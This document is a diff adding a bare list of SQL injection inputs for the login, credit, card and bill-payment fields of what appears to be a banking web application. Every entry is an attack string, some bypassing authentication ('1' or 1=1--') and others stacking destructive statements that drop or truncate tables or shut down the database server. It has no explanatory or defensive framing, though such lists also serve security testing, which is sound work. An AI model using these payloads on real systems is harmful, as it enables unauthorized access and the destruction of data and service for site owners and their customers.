@@ -1,0 +1,82 @@
+
+
+
+
+
+Admin
+   login:
+   Acc no : 1 or 1=1
+   pass   : 1' or 1=1--
+   
+   Accno  :1000
+   pass   :1' or 1=1--
+   
+   Accno  :1 or 1=1
+   pass   :correct password
+
+   Accno  :1000--	
+   pass   :any 
+  
+   Accno  : 1000;truncate table tablename--
+   pass   :any
+  
+   Accno  :1000;drop table tablename--
+   pass   :any
+
+   Accno  :1000;shutdown--
+   pass   :any
+  
+   Accno  :1000
+   pass   :1'shutdown--
+
+
+ Amount credit:
+   
+      Account number: 1010;Shutdown--
+                    : 1010;truncate table tablename--
+                    : 1010;Drop table tablename--
+    
+            
+
+ 
+Customer login:
+
+   Acc no : 1 or 1=1
+   pass   : 1' or 1=1--
+   
+   Accno  :1000
+   pass   :1' or 1=1--
+   
+   Accno  :1 or 1=1
+   pass   :correct password
+
+   Accno  :1000--	
+   pass   :any 
+  
+   Accno  : 1000;truncate table tablename--
+   pass   :any
+  
+   Accno  :1000;drop table tablename--
+   pass   :any
+
+   Accno  :1000;shutdown--
+   pass   :any
+  
+   Accno  :1000
+   pass   :1'shutdown--
+
+  
+ credit card:
+          
+       login  Same as above
+
+   Bill process:
+  
+   pay your bill:10;shutdown--
+                :10;drop table tablename--
+                :10;truncate table tablename--
+    
+         
+
+
+
